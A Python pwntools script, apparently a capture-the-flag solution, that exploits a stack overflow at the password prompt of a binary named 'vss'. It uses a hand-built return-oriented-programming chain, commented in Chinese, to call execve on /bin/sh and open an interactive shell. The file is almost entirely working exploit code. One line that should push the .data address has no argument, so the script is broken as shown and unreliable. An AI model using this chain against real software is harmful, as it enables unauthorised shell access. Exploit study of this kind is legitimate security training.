from pwn import *
from struct import pack

proc = process('./vss')

# add rsp 58h; ret
asr_addr = 0x46f205

# p 用来构造 sys_execue
p = b''

# 将 data 段地址写入到 rsi 中
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q',  ) # @ .data

# 将 '/bin//sh' 写入到 rax 中, '/bin//sh' 实际为 ['/', 'b', 'i', 'n', '/', 's', 'h', '/0']
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += b'/bin//sh'

# 将 '/bin//sh' 保存到 .data 上
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret

# 将 rsi 设置为 .data + 8
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8

# rax 置0
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret

# 将 .data + 8 - .data + 16 设置为 0 (作为参数)
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret

# 将 rdi 设置为 .data ("/bin/sh")
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data

# 将 rsi 设置为 .data + 8 (命令行参数)
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8

# 将 rdx 设置为 .data + 8 (环境变量参数)
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8

# 将 rax 的值增加到 59
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004004b8) # syscall

payload = flat([b"py", b'A' * 0x46, p64(asr_addr), b'A' * 0x8, p])

proc.recvuntil(b"Password:")
proc.sendline(payload)

# 打开交互式窗口
proc.interactive()
